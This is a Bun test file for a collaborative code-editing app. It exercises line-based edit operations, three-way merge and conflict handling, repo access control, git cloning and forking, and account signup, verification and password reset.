import { afterAll, describe, expect, setDefaultTimeout, setSystemTime, test } from "bun:test";
import { apply, empty, fromText, merge, mergeWords, replay, text, type Applied, type Doc } from "../src/lines.ts";
import { diffToOps } from "../src/sync.ts";
import { lintMerge, newProblems } from "../src/lint.ts";
import { local as boot, type Call } from "../src/local.ts";
import { run } from "../agents.ts";
import { GameRoom } from "../src/game-do.ts";
import { noodles } from "../src/noodles.ts";
import { isBuildFile } from "../src/buildfiles.ts";
import worker from "../src/worker.ts";
import { ruleFor } from "../src/limits.ts";

// These run the app end to end (real git, password hashes, in-process D1): fine alone,
// but a full run on a busy machine can stretch one past bun's 5s default.
setDefaultTimeout(20_000);

// Every app instance makes a temp dir of git repos; remove them all at the end.
const opened: { close(): void }[] = [];
afterAll(() => { for (const o of opened) o.close(); });
const local = async (extra?: Record<string, unknown>) => { const c = await boot(extra); opened.push(c); return c; };

const post = (call: Call, user: string | null, path: string, body: unknown) =>
  call(user, path, { method: "POST", body: JSON.stringify(body) });

describe("lines", () => {
  test("ops address lines by id, so edits elsewhere don't shift them", () => {
    const doc = empty();
    apply(doc, fromText("a\nb\nc"), "me");
    expect(apply(doc, [{ kind: "insert", after: null, text: "top" }], "x").ok).toBe(true);
    // L2 is still "b" even though everything moved down one.
    expect(apply(doc, [{ kind: "set", line: "L2", base: 2, text: "B" }], "y").ok).toBe(true);
    expect(text(doc)).toBe("top\na\nB\nc");
  });

  test("ifRev pins a batch to the whole file", () => {
    const doc = empty();
    apply(doc, fromText("a\nb"), "me");
    apply(doc, [{ kind: "set", line: "L2", base: 2, text: "B" }], "x");
    expect(apply(doc, [{ kind: "set", line: "L1", base: 1, text: "A" }], "y", 0, 2).ok).toBe(false);
    expect(apply(doc, [{ kind: "set", line: "L1", base: 1, text: "A" }], "y", 0, 3).ok).toBe(true);
  });

  test("a stale base is a conflict and the batch is all-or-nothing", () => {
    const doc = empty();
    apply(doc, fromText("a\nb"), "me");
    apply(doc, [{ kind: "set", line: "L1", base: 1, text: "A" }], "x");
    const r = apply(doc, [{ kind: "set", line: "L2", base: 2, text: "B" }, { kind: "set", line: "L1", base: 1, text: "nope" }], "y");
    expect(r.ok).toBe(false);
    expect(text(doc)).toBe("A\nb");
  });

  test("replaying the log rebuilds any past rev, blame included", () => {
    const doc = empty(), log: Applied[] = [];
    const go = (r: ReturnType<typeof apply>) => { if (r.ok) log.push(...r.applied); };
    go(apply(doc, fromText("one\ntwo"), "me"));
    go(apply(doc, [{ kind: "set", line: "L1", base: 1, text: "ONE" }], "x"));
    go(apply(doc, [{ kind: "delete", line: "L2", base: 2 }], "y"));
    expect(text(replay(log, 2))).toBe("one\ntwo");
    expect(replay(log, 3).lines[0]).toEqual({ id: "L1", text: "ONE", by: "x", rev: 3 });
    expect(replay(log)).toEqual(doc);
  });
});

describe("merge", () => {
  const fork = (content: string) => { const main = empty(); apply(main, fromText(content), "me"); return { base: structuredClone(main), main, branch: structuredClone(main) }; };
  const land = (main: Doc, m: ReturnType<typeof merge>) => { const r = apply(main, m.ops, m.by, 0, main.rev); expect(r.ok).toBe(true); return text(main); };

  test("lines only one side touched merge cleanly, each keeping its author", () => {
    const { base, main, branch } = fork("a\nb\nc");
    apply(main, [{ kind: "set", line: "L1", base: 1, text: "A" }, { kind: "insert", after: "L3", text: "main's" }], "ana");
    apply(branch, [{ kind: "set", line: "L2", base: 2, text: "B" }, { kind: "insert", after: "L2", text: "x" }, { kind: "insert", after: "L4", text: "y" }, { kind: "delete", line: "L3", base: 3 }], "bot");
    // As prose: in code, main's line right after the one the branch deleted would be a conflict (see below).
    const m = merge(base, branch, main, {}, "bot", "notes.md");
    expect(m.conflicts).toEqual([]);
    expect(land(main, m)).toBe("A\nB\nx\ny\nmain's");
    expect(main.lines.map((l) => l.by)).toEqual(["ana", "bot", "bot", "bot", "ana"]);
  });

  test("a line both sides changed is a conflict until it's settled", () => {
    const { base, main, branch } = fork("a\nb");
    apply(main, [{ kind: "set", line: "L1", base: 1, text: "main" }, { kind: "delete", line: "L2", base: 2 }], "ana");
    apply(branch, [{ kind: "set", line: "L1", base: 1, text: "branch" }, { kind: "set", line: "L2", base: 2, text: "B" }], "bot");
    // Main deleted L2 where the branch changed it: the two lines are one stretch both reshaped.
    expect(merge(base, branch, main).conflicts).toEqual([{ line: "L1", base: "a\nb", main: "main", branch: "branch\nB" }]);
    expect(land(structuredClone(main), merge(base, branch, main, { L1: "branch" }))).toBe("branch\nB");
    expect(land(structuredClone(main), merge(base, branch, main, { L1: "main" }))).toBe("main");
  });

  test("the same change on both sides, or a line deleted on both, is no change", () => {
    const { base, main, branch } = fork("a\nb");
    for (const d of [main, branch]) apply(d, [{ kind: "set", line: "L1", base: 1, text: "A" }, { kind: "delete", line: "L2", base: 2 }], "x");
    expect(merge(base, branch, main)).toEqual({ ops: [], by: [], conflicts: [] });
  });

  // Each side edits as an agent would: plain text, diffed back to line ops.
  const sides = (content: string, onMain: string, onBranch: string) => {
    const f = fork(content);
    apply(f.main, diffToOps(f.main.lines, onMain.split("\n")), "ana");
    apply(f.branch, diffToOps(f.branch.lines, onBranch.split("\n")), "bot");
    return f;
  };
  const clean = (content: string, onMain: string, onBranch: string) => {
    const { base, main, branch } = sides(content, onMain, onBranch), m = merge(base, branch, main, {}, "bot");
    expect(m.conflicts).toEqual([]);
    return land(main, m);
  };

  test("a line moved on one side keeps the other side's edit", () => {
    expect(clean("# T\na\nb\nc", "# T\nb\na\nc", "# T\nA\nb\nc")).toBe("# T\nb\nA\nc");
    expect(clean("# T\na\nb\nc", "# T\nA\nb\nc", "# T\nb\na\nc")).toBe("# T\nb\nA\nc");
    // Moved on main, deleted on the branch: it's gone.
    expect(clean("# T\na\nb\nc", "# T\nb\na\nc", "# T\nb\nc")).toBe("# T\nb\nc");
    // Moved on both: it lands once, where main put it.
    expect(clean("# T\na\nb\nc", "# T\nb\nc\na", "# T\nb\na\nc")).toBe("# T\nb\nc\na");
  });

  test("lines the branch added under a line main moved follow it", () => {
    expect(clean("# T\na\nb\nc", "# T\nb\nc\na", "# T\na\nx\ny\nb\nc")).toBe("# T\nb\nc\na\nx\ny");
    // Moved up, too.
    expect(clean("# T\na\nb\nc", "# T\nc\na\nb", "# T\na\nb\nc\nz")).toBe("# T\nc\nz\na\nb");
  });

  test("a moved block of repeated lines is a move, not a rewrite", () => {
    const f = (name: string) => `function ${name}() {\n  if (x) {\n    go();\n  }\n}`;
    const rest = Array.from({ length: 12 }, (_, i) => `const v${i} = ${i};`).join("\n");
    // Main moves two functions to the end: each `  if (x) {`, `    go();`, `  }` and `}` moved twice, so only the block around `function a() {` says which is which.
    const was = `${f("a")}\n${f("c")}\n${rest}`, onMain = `${rest}\n${f("a")}\n${f("c")}`;
    const goA = f("a").replace("go()", "go(1)");
    expect(clean(was, onMain, `${goA}\n${f("c")}\n${rest}`)).toBe(`${rest}\n${goA}\n${f("c")}`);
    // Lines added under the block follow it too.
    expect(clean(was, onMain, `${f("a")}\n// a done\n${f("c")}\n${rest}`)).toBe(`${rest}\n${f("a")}\n// a done\n${f("c")}`);
  });

  test("the same new line added at the same spot on both sides lands once", () => {
    expect(clean("# T\na", "# T\nimport y\nimport z\na", "# T\nimport z\na")).toBe("# T\nimport y\nimport z\na");
    // Apart, they're two lines someone meant.
    expect(clean("a\nb\nc", "z\na\nb\nc", "a\nb\nc\nz")).toBe("z\na\nb\nc\nz");
  });

  test("a line both sides changed merges word by word when the edits don't touch", () => {
    expect(clean("x\n  foo(1, 2)\ny", "x\n    foo(1, 2)\ny", "x\n  foo(1, 3)\ny")).toBe("x\n    foo(1, 3)\ny");
    expect(mergeWords("let a = 1;", "const a = 1;", "let a = 2;")).toBe("const a = 2;");
    // The same words rewritten two ways is still a conflict.
    expect(mergeWords("foo(1)", "foo(2)", "foo(3)")).toBeNull();
    const { base, main, branch } = sides("x\nfoo(1)", "x\nfoo(2)", "x\nfoo(3)");
    expect(merge(base, branch, main).conflicts).toEqual([{ line: "L2", base: "foo(1)", main: "foo(2)", branch: "foo(3)" }]);
    // A rename on one side and a new use of the old name on the other: merged, it would use a name that's gone.
    expect(mergeWords("const r = f(); g(r.ok)", "const r = f(); if (r) g(r.ok)", "const t = f(); g(t.ok)")).toBeNull();
  });

  test("a stretch both sides rewrote is one conflict, settled whole", () => {
    // Both rewrote tryWith (from PR #243 against main): no half of each.
    const was = "a\nconst tryWith = (us) => tester(remote, us);\nconst all = tryWith(updates);\nz";
    const onMain = "a\nlet slowest = 0;\nconst tryWith = async (us) => {\n  slowest = 1;\n  return tester(remote, us);\n};\nconst all = tryWith(updates);\nz";
    const onBranch = "a\nconst tryWith = async (us) => { const t = await tester(r, us); tried.set(us, t); return t; };\nconst all = tryWith(updates);\nz";
    const { base, main, branch } = sides(was, onMain, onBranch), m = merge(base, branch, main);
    expect(m.conflicts).toEqual([{ line: "L2", base: "const tryWith = (us) => tester(remote, us);", main: onMain.split("\n").slice(1, 6).join("\n"), branch: onBranch.split("\n")[1] }]);
    expect(land(structuredClone(main), merge(base, branch, main, { L2: "branch" }))).toBe(onBranch);
    expect(land(structuredClone(main), merge(base, branch, main, { L2: "main" }))).toBe(onMain);
    // The same rewrite on both sides is no conflict.
    expect(clean(was, onMain, onMain)).toBe(onMain);
  });

  test("a settled merge that would no longer build is a conflict until someone lands it anyway", () => {
    // PR #243's deps.ts: keeping the branch's tryWith drops the `short` main declared, and main's later line still reads it.
    const was = "const tryWith = (us) => tester(us);\nconst all = tryWith(updates);\nlog(all);";
    const onMain = "let short = false;\nconst tryWith = async (us) => {\n  short = true;\n  return tester(us);\n};\nconst all = tryWith(updates);\nlog(all);\nif (short) log(\"short\");";
    const onBranch = "const tryWith = async (us) => tester(us, tried);\nconst all = tryWith(updates);\nlog(all);";
    const { base, main, branch } = sides(was, onMain, onBranch), m = merge(base, branch, main, { L1: "branch" });
    expect(m.conflicts).toEqual([]);
    // The globals both sides use (tester, log, updates) and the branch's own `tried` aren't new.
    expect(lintMerge("deps.ts", main, branch, m, { L1: "branch" })).toEqual([{ line: "lint:undefined:short", base: "", main: null, branch: null, lint: "`short` is not defined (line 4)" }]);
    expect(lintMerge("deps.ts", main, branch, m, { L1: "branch", "lint:undefined:short": "branch" })).toEqual([]);
    // Only code is checked.
    expect(lintMerge("deps.md", main, branch, m)).toEqual([]);
  });

  test("the merge check: redeclared names, undefined names and broken syntax, new ones only", () => {
    const keys = (merged: string, a = "", b = "") => newProblems("x.ts", merged, a, b).map((p) => p.key);
    expect(keys("const tryWith = 1;\nconst tryWith = 2;")).toEqual(["redeclared:tryWith"]);
    expect(keys("if (a {")).toEqual(["syntax:UnexpectedToken"]);
    expect(keys("f(a, b)", "f(a)", "f(b)")).toEqual([]);
    // Scopes, hoisting, patterns, types, keys and labels aren't uses of an undefined name.
    expect(keys([
      "import { a } from './a'; import type { T } from './t';",
      "export function f<U>({ b, c: [d] = [] }: T, ...e: U[]): T { return g(a, b, d, e, h, arguments) }",
      "function g(...xs: unknown[]) { var h = 1; return xs }",
      "const o = { k: 1, m() { return this.k }, [a]: 2 }; o.k; out: for (const [i, j] of Object.entries(o)) { if (i) break out; j }",
      "class C extends Array<T> { #p = 1; static s = C; q(x = this.#p) { try {} catch ({ message }) { return message ?? x } } }",
      "enum E { A = 1 } namespace N { export const v = E.A } declare const env: { z: number }; env.z as number; N.v; new C();",
    ].join("\n"))).toEqual(["undefined:h", "undefined:Object", "undefined:Array"]);
  });

  // The same edits merged as a file at `path` (from PR #244 against main).
  const at = (path: string, content: string, onMain: string, onBranch: string, resolve = {}) => {
    const { base, main, branch } = sides(content, onMain, onBranch);
    return { m: merge(base, branch, main, resolve, "bot", path), main };
  };

  test("a lockfile both changed is one whole-file conflict: keep a side, then regenerate", () => {
    const was = `{\n  "packages": {\n    "varlock": ["varlock@1.20.0"],\n  }\n}`;
    const onMain = was.replace("1.20.0", "1.21.1"), onBranch = was.replace("1.20.0", "1.22.0");
    expect(at("bun.lock", was, onMain, onBranch).m.conflicts).toEqual([{ line: "file", base: "", main: null, branch: null, whole: true }]);
    const { m, main } = at("bun.lock", was, onMain, onBranch, { file: "branch" });
    expect(land(main, m)).toBe(onBranch);
    // Only one side changed it: nothing to settle.
    expect(at("bun.lock", was, onMain, was).m.conflicts).toEqual([]);
  });

  test("a config key the merge would define twice is a conflict", () => {
    // Each side added BETTER_AUTH_SECRET, in a different place with a different value.
    const was = "# @required\nGITHUB_ID=\n\n# deploys\nDEPLOY_KEY=";
    const onMain = "# @required\nBETTER_AUTH_SECRET=op(op://cs/auth)\nGITHUB_ID=\n\n# deploys\nDEPLOY_KEY=", onBranch = "# @required\nGITHUB_ID=\n\n# deploys\nDEPLOY_KEY=\nBETTER_AUTH_SECRET=";
    expect(at(".env.schema", was, onMain, onBranch).m.conflicts).toEqual([{ line: "key:BETTER_AUTH_SECRET", base: "", main: "BETTER_AUTH_SECRET=op(op://cs/auth)", branch: "BETTER_AUTH_SECRET=" }]);
    const kept = at(".env.schema", was, onMain, onBranch, { "key:BETTER_AUTH_SECRET": "main" });
    expect(land(kept.main, kept.m)).toBe(onMain);
    // Nested keys count by their path: two "version"s in different objects are fine.
    expect(at("package.json", `{\n  "a": {\n    "v": 1\n  }\n}`, `{\n  "a": {\n    "v": 1\n  },\n  "b": {\n    "v": 2\n  }\n}`, `{\n  "a": {\n    "v": 1\n  }\n}`).m.conflicts).toEqual([]);
    const json = (deps: string) => `{\n  "dependencies": {\n${deps}\n  }\n}`;
    const dup = at("package.json", json(`    "a": "1"`), json(`    "z": "2",\n    "a": "1"`), json(`    "a": "1",\n    "z": "3"`));
    expect(dup.m.conflicts.map((x) => x.line)).toEqual(["key:dependencies.z"]);
    for (const [pick, want] of [["main", `    "z": "2",\n    "a": "1"`], ["branch", `    "a": "1",\n    "z": "3"`]] as const) {
      const r = at("package.json", json(`    "a": "1"`), json(`    "z": "2",\n    "a": "1"`), json(`    "a": "1",\n    "z": "3"`), { "key:dependencies.z": pick });
      expect(land(r.main, r.m)).toBe(json(want));
    }
  });

  test("in code, lines added next to lines the other side deleted are a conflict; in prose they merge", () => {
    // Main stopped defining `set`; the branch added a new use of it right there.
    const was = "const agents = on();\nconst set = (n) => !!env[n];\nif (agents && !set(\"X\")) fail();";
    const onMain = "const agents = on();";
    const onBranch = "const agents = on();\nconst set = (n) => !!env[n];\nif (agents && !set(\"X\")) fail();\nif (deploys && !set(\"X\")) fail();";
    expect(at("rustybuns.config.ts", was, onMain, onBranch).m.conflicts).toHaveLength(1);
    const doc = "# T\nold para\nmore", docMain = "# T", docBranch = "# T\nold para\nmore\nnew para";
    const r = at("README.md", doc, docMain, docBranch);
    expect(r.m.conflicts).toEqual([]);
    expect(land(r.main, r.m)).toBe("# T\nnew para");
  });

  test("the same line added on both sides in different places would land twice: a conflict", () => {
    const { base, main, branch } = sides("a\nb\nc", "import { z } from './z'\na\nb\nc", "a\nb\nimport { z } from './z'\nc");
    const m = merge(base, branch, main);
    expect(m.conflicts).toEqual([{ line: "L4", base: "", main: "import { z } from './z'", branch: "import { z } from './z'", doubled: true }]);
    expect(land(structuredClone(main), merge(base, branch, main, { L4: "main" }))).toBe("import { z } from './z'\na\nb\nc");
    expect(land(structuredClone(main), merge(base, branch, main, { L4: "branch" }))).toBe("import { z } from './z'\na\nb\nimport { z } from './z'\nc");
    // A line the file already repeats (a test's setup call) isn't flagged either.
    const setup = "await post(call, 'ana', '/api/repos', { name: 'r' });";
    expect(clean(`${setup}\na\nb`, `${setup}\na\n${setup}\nb`, `${setup}\na\nb\n${setup}`)).toBe(`${setup}\na\n${setup}\nb\n${setup}`);
    // A short or bare line ("}", "return;") repeats all the time: it isn't flagged.
    expect(clean("a\nb\nc", "}\na\nb\nc", "a\nb\n}\nc")).toBe("}\na\nb\n}\nc");
  });
});

describe("app", () => {
  test("private repos are invisible to everyone else, in search too", async () => {
    const call = await local();
    await post(call, "ana", "/api/login", { name: "ana" });
    await post(call, "ana", "/api/repos", { name: "secret", visibility: "private" });
    await post(call, "ana", "/api/repos/ana/secret/files", { path: "x.ts", content: "const hidden_tuba = 1" });
    await post(call, "ana", "/api/repos/ana/secret/do/commit?path=x.ts", {});

    expect((await call("bo", "/api/repos/ana/secret")).status).toBe(404);
    expect((await call(null, "/api/repos/ana/secret/do/file?path=x.ts")).status).toBe(404);
    expect(await (await call("bo", "/api/search?q=hidden_tuba")).json()).toEqual([]);
    expect(await (await call("ana", "/api/search?q=hidden_tuba")).json()).toHaveLength(1);
    expect((await call("bo", "/api/users/ana").then((r) => r.json()) as any).repos).toEqual([]);
  });

  test("only owners and collaborators write", async () => {
    const call = await local();
    await post(call, "ana", "/api/login", { name: "ana" });
    await post(call, "ana", "/api/repos", { name: "r" });
    await post(call, "ana", "/api/repos/ana/r/files", { path: "a", content: "x" });
    const op = { ops: [{ kind: "insert", after: null, text: "hi" }] };
    expect((await post(call, "bo", "/api/repos/ana/r/do/ops?path=a", op)).status).toBe(403);
    await post(call, "ana", "/api/repos/ana/r/collaborators", { name: "bo" });
    expect((await post(call, "bo", "/api/repos/ana/r/do/ops?path=a", op)).status).toBe(200);
  });

  test("a playlist track is a line range, read live from the file", async () => {
    const call = await local();
    await post(call, "ana", "/api/login", { name: "ana" });
    await post(call, "ana", "/api/repos", { name: "r" });
    await post(call, "ana", "/api/repos/ana/r/files", { path: "a.js", content: "1\n2\n3\n4" });
    const pl = await (await post(call, "bo", "/api/playlists", { title: "tasty" })).json() as any;
    expect((await post(call, "bo", `/api/playlists/${pl.id}/tracks`, { owner: "ana", repo: "r", path: "a.js", from: 2, to: 3, note: "nice" })).status).toBe(201);
    const got = await (await call(null, `/api/playlists/${pl.id}`)).json() as any;
    expect(got.tracks[0].lines.map((l: any) => l.text)).toEqual(["2", "3"]);
    // Two lines land above it: the track follows its lines, not the numbers.
    await post(call, "ana", "/api/repos/ana/r/do/ops?path=a.js", { ops: [{ kind: "insert", after: null, text: "new" }, { kind: "insert", after: null, text: "newer" }] });
    const moved = await (await call(null, `/api/playlists/${pl.id}`)).json() as any;
    expect(moved.tracks[0].lines.map((l: any) => l.text)).toEqual(["2", "3"]);
    expect([moved.tracks[0].from_line, moved.tracks[0].to_line]).toEqual([4, 5]);
  });

  test("three agents editing one file at once converge, and the commit indexes it", async () => {
    const { doc, stats, commit } = await run(await local(), { log: () => {} });
    const t = doc.lines.map((l: any) => l.text).join("\n");
    expect(t).not.toMatch(/\bfoo\b|^var /m);
    // The linter's const-or-let needs the whole file to hold still (ifRev), so it's right.
    expect(t).toContain("let total = 0");
    expect(t).toContain('const label = "sum is"');
    expect(t.match(/^\/\*\*/gm)).toHaveLength(3);
    expect(commit.rev).toBe(doc.rev);
    expect(Object.values(stats).every((s) => s.edits > 0)).toBe(true);
  });
});

describe("artifacts", () => {
  test("cataloguing pushes the repo's catalogued files as a git commit you can clone", async () => {
    const call = await local();
    await post(call, "ana", "/api/login", { name: "ana" });
    await post(call, "ana", "/api/repos", { name: "dig" });
    await post(call, "ana", "/api/repos/ana/dig/files", { path: "src/a.ts", content: "export const a = 1" });
    await post(call, "ana", "/api/repos/ana/dig/files", { path: "README", content: "found it" });
    const c1 = await (await post(call, "ana", "/api/repos/ana/dig/do/commit?path=src%2Fa.ts", { message: "first find" })).json() as any;
    expect(c1.git.commit).toMatch(/^[0-9a-f]{40}$/);
    const c2 = await (await post(call, "ana", "/api/repos/ana/dig/do/commit?path=README", { message: "second" })).json() as any;
    expect(c2.git.parent).toBe(c1.git.commit);

    const repo = await call.artifacts.get("ana--dig");
    expect((await repo.log()).map((c) => c.message)).toEqual(["second", "first find"]);
    expect(await (await repo.readFile({ ref: "main", path: "src/a.ts" }))!.text()).toBe("export const a = 1\n");

    // The clone command on the repo page works with a stock git client.
    const { clone } = await (await call(null, "/api/repos/ana/dig")).json() as any;
    const dir = (await import("node:fs")).mkdtempSync((await import("node:path")).join((await import("node:os")).tmpdir(), "cs-clone-"));
    const p = Bun.spawn(["sh", "-c", clone], { cwd: dir, stdout: "pipe", stderr: "pipe" });
    expect(await p.exited).toBe(0);
    expect(await Bun.file(`${dir}/dig/README`).text()).toBe("found it\n");
    (await import("node:fs")).rmSync(dir, { recursive: true, force: true });
  });
});

describe("levels", () => {
  test("browse a level, fork it, open a deep file, catalogue it: the push keeps every other file", async () => {
    const call = await local();
    // Stand in for an import (which needs the network): a repo with a few files, marked ready.
    const ns = call.artifacts, { push } = await import("../src/git.ts");
    const made = await ns.create("level-hono");
    await push(made.remote, made.token, { changes: { "README.md": "hono\n", "src/a.ts": "export const a = 1\n", "src/deep/b.ts": "b\n" }, message: "upstream", author: "upstream" });
    await call.env.DB.prepare("INSERT INTO levels (slug, status) VALUES ('hono', 'ready')").run();

    const levels = await (await call(null, "/api/levels")).json() as any[];
    expect(levels.map((l) => l.slug).slice(0, 7)).toEqual(["mitt", "clsx", "ky", "zustand", "hono", "express", "preact"]);
    expect(levels.map((l) => l.slug)).toContain("workerd");
    expect(levels.at(-1).slug).toBe("bun");
    expect(levels[4].status).toBe("ready");
    expect(levels[6].status).toBe("buried");
    const root = await (await call(null, "/api/levels/hono/tree")).json() as any;
    expect(root.entries.map((e: any) => [e.name, e.type])).toEqual([["src", "dir"], ["README.md", "file"]]);
    expect((await (await call(null, "/api/levels/hono/tree?path=src")).json() as any).entries.map((e: any) => e.path)).toEqual(["src/deep", "src/a.ts"]);
    expect((await (await call(null, "/api/levels/hono/file?path=src/a.ts")).json() as any).text).toBe("export const a = 1\n");
    expect((await call(null, "/api/levels/preact/tree")).status).toBe(409);             // not excavated yet
    expect((await post(call, null, "/api/levels/preact/import", {})).status).toBe(403);   // and not by strangers

    await post(call, "ana", "/api/login", { name: "ana" });
    expect((await post(call, "ana", "/api/levels/hono/fork", { name: "my-hono" })).status).toBe(201);
    // The fork says where it came from and that its git is local.
    const meta = await (await call("ana", "/api/repos/ana/my-hono")).json() as any;
    expect([meta.upstream, meta.upstream_commit?.length, meta.home]).toEqual(["github:honojs/hono", 40, "local"]);
    const tree = await (await call("ana", "/api/repos/ana/my-hono/tree?path=src/deep")).json() as any;
    expect(tree.entries.map((e: any) => e.path)).toEqual(["src/deep/b.ts"]);

    // Opening a file from history makes it a live DO, attributed to upstream.
    const f = "/api/repos/ana/my-hono/do", q = "?path=" + encodeURIComponent("src/deep/b.ts");
    const doc = await (await call("ana", `${f}/file${q}`)).json() as any;
    expect(doc.lines.map((l: any) => [l.text, l.by])).toEqual([["b", "upstream"]]);
    await post(call, "ana", `${f}/ops${q}`, { ops: [{ kind: "set", line: doc.lines[0].id, base: doc.lines[0].rev, text: "B, dug up" }] });
    const c = await (await post(call, "ana", `${f}/commit${q}`, { message: "dig" })).json() as any;
    expect(c.git.commit).toMatch(/^[0-9a-f]{40}$/);

    const repo = await ns.get("ana--my-hono");
    expect((await repo.log()).map((x) => x.message)).toEqual(["dig", "upstream"]);
    expect(await (await repo.readFile({ ref: "main", path: "src/deep/b.ts" }))!.text()).toBe("B, dug up\n");
    expect(await (await repo.readFile({ ref: "main", path: "src/a.ts" }))!.text()).toBe("export const a = 1\n");
    expect(await (await repo.readFile({ ref: "main", path: "README.md" }))!.text()).toBe("hono\n");
    // The level itself is untouched.
    expect((await (await ns.get("level-hono")).log()).length).toBe(1);
  });
});

/** The app with accounts on, and helpers to sign up, pick a handle and ask who you are. */
async function accounts(extra: Record<string, unknown> = {}) {
  const origin = "http://codesplitters.local";
  const call = await local({ BETTER_AUTH_SECRET: "test-secret-".padEnd(40, "x"), BETTER_AUTH_URL: origin, ...extra });
  const signup = async (email: string, name: string, headers: Record<string, string> = {}) => {
    const res = await call(null, "/api/auth/sign-up/email", { method: "POST", headers: { "content-type": "application/json", origin, ...headers },
      body: JSON.stringify({ email, password: "correct horse battery", name }) });
    return (res.headers.getSetCookie?.() ?? [res.headers.get("set-cookie")!]).map((c) => c.split(";")[0]).join("; ");
  };
  const session = async (cookie = "") => (await (await call(null, "/api/session", { headers: { cookie } })).json()) as any;
  const claim = (cookie: string, name: string, headers: Record<string, string> = {}) =>
    call(null, "/api/handle", { method: "POST", headers: { cookie, ...headers }, body: JSON.stringify({ name }) });
  /** Sign up and claim `handle`: the cookie of someone ready to dig. */
  const person = async (email: string, handle: string) => { const c = await signup(email, handle); expect((await claim(c, handle)).status).toBe(201); return c; };
  return { call, signup, session, claim, person };
}

describe("accounts", () => {
  test("with a secret set, Better Auth signs people up, then they pick the handle the app sees", async () => {
    const { call, signup, session, claim } = await accounts();
    expect(await session()).toEqual({ mode: "accounts", user: null, providers: ["email"] });
    expect((await post(call, null, "/api/login", { name: "ana" })).status).toBe(404);   // no aliases now

    const cookie = await signup("ana@example.com", "Ana Lyst");
    // Signed in, no handle yet: the page is offered a free one to start from.
    expect(await session(cookie)).toMatchObject({ user: null, pick: { suggest: "ana-lyst", email: "ana@example.com" } });
    expect((await call(null, "/api/repos", { method: "POST", headers: { cookie }, body: JSON.stringify({ name: "dig" }) })).status).toBe(401);
    expect((await claim(cookie, "analyst")).status).toBe(201);
    expect((await session(cookie)).user).toBe("analyst");
    expect((await session(cookie)).pick).toBeUndefined();
    expect((await claim(cookie, "another-one")).status).toBe(409);                        // once, for good
    const me = await (await call(null, "/api/me", { headers: { cookie } })).json() as any;
    expect(me.name).toBe("analyst");
    expect((await call(null, "/api/repos", { method: "POST", headers: { cookie }, body: JSON.stringify({ name: "dig" }) })).status).toBe(201);
  });
});

describe("account email", () => {
  /** A stand-in for the send_email binding: what was sent, and the link in the last one to `to`. */
  const outbox = () => {
    const sent: { from: unknown; to: string; subject: string; text: string; html?: string }[] = [];
    return { sent, EMAIL: { send: async (m: (typeof sent)[number]) => { sent.push(m); return { messageId: String(sent.length) }; } },
      link: (to: string) => { const m = sent.findLast((s) => s.to === to)!; const u = new URL(/https?:\/\/\S+/.exec(m.text)![0]); return u.pathname + u.search; } };
  };
  const cookies = (res: Response) => (res.headers.getSetCookie?.() ?? []).map((c) => c.split(";")[0]).join("; ");

  test("without a sender there's no mail: no reset, no verification, and no grant for a typed email", async () => {
    const { call, signup, session } = await accounts({ ADMINS: "boss-person" });
    const cookie = await signup("ana@example.com", "Ana Lyst");
    expect(await session(cookie)).not.toHaveProperty("unverified");
    expect(await session()).not.toHaveProperty("mail");
    const reset = await call(null, "/api/auth/request-password-reset", { method: "POST", headers: { "content-type": "application/json", origin: "http://codesplitters.local" },
      body: JSON.stringify({ email: "ana@example.com", redirectTo: "/?reset=1" }) });
    expect(reset.status).toBe(400);
  });

  test("signup mails a verification link; opening it verifies the email, so a grant lands", async () => {
    const box = outbox();
    const { call, signup, session, person } = await accounts({ ADMINS: "boss-person", EMAIL: box.EMAIL, EMAIL_FROM: "accounts@example.com" });
    const boss = await person("boss@example.com", "boss-person");
    await call(null, "/api/admin/handles", { method: "POST", headers: { cookie: boss }, body: JSON.stringify({ handle: "zed", email: "zed@example.com" }) });

    const res = await call(null, "/api/auth/sign-up/email", { method: "POST", headers: { "content-type": "application/json", origin: "http://codesplitters.local" },
      body: JSON.stringify({ email: "zed@example.com", password: "correct horse battery", name: "Zed", callbackURL: "/?verified=1" }) });
    const zed = cookies(res);
    expect(box.sent.at(-1)).toMatchObject({ to: "zed@example.com", from: { email: "accounts@example.com", name: "codeSplitters" }, subject: "Verify your codeSplitters email" });
    expect(await session(zed)).toMatchObject({ mail: true, unverified: "zed@example.com", user: null });   // typed, so no grant yet

    const opened = await call(null, box.link("zed@example.com"), { headers: { cookie: zed } });
    expect(opened.status).toBe(302);
    expect(new URL(opened.headers.get("location")!, "http://codesplitters.local").search).toBe("?verified=1");
    const after = await session(zed);
    expect(after.user).toBe("zed");
    expect(after).not.toHaveProperty("unverified");

    // A bad link goes back with an error, not a verification.
    const bad = await call(null, "/api/auth/verify-email?token=nope&callbackURL=%2F%3Fverified%3D1");
    expect(bad.headers.get("location")).toContain("error=");
  });

  test("a forgotten password: a link by email, a new password, and the old sessions signed out", async () => {
    const box = outbox();
    const { call, signup, session } = await accounts({ EMAIL: box.EMAIL, EMAIL_FROM: "accounts@example.com" });
    const ana = await signup("ana@example.com", "Ana Lyst");
    const ask = (email: string) => call(null, "/api/auth/request-password-reset", { method: "POST", headers: { "content-type": "application/json", origin: "http://codesplitters.local" },
      body: JSON.stringify({ email, redirectTo: "/?reset=1" }) });
    // The same answer for an address with no account, and nothing sent.
    const before = box.sent.length;
    expect((await ask("nobody@example.com")).status).toBe(200);
    expect(box.sent.length).toBe(before);
    expect((await ask("ana@example.com")).status).toBe(200);
    expect(box.sent.at(-1)!.subject).toBe("Reset your codeSplitters password");

    // The link hands the page a token, which sets the new password.
    const opened = await call(null, box.link("ana@example.com"));
    const back = new URL(opened.headers.get("location")!, "http://codesplitters.local");
    expect(back.searchParams.get("reset")).toBe("1");
    const token = back.searchParams.get("token")!;
    const json = { "content-type": "application/json", origin: "http://codesplitters.local" };
    expect((await call(null, "/api/auth/reset-password", { method: "POST", headers: json, body: JSON.stringify({ newPassword: "a brand new one", token }) })).status).toBe(200);
    expect((await call(null, "/api/auth/reset-password", { method: "POST", headers: json, body: JSON.stringify({ newPassword: "again and again", token }) })).status).toBe(400);   // once
    expect((await session(ana)).pick).toBeUndefined();                                   // signed out
    const signin = (password: string) => call(null, "/api/auth/sign-in/email", { method: "POST", headers: json, body: JSON.stringify({ email: "ana@example.com", password }) });
    expect((await signin("correct horse battery")).status).toBe(401);
    expect((await signin("a brand new one")).status).toBe(200);
  });

  test("reset and verification requests count against the mail limit", () => {
    expect(ruleFor("POST", ["", "auth", "request-password-reset"])).toBe("mail");
    expect(ruleFor("POST", ["", "auth", "send-verification-email"])).toBe("mail");
    expect(ruleFor("POST", ["", "auth", "reset-password"])).toBeNull();
  });

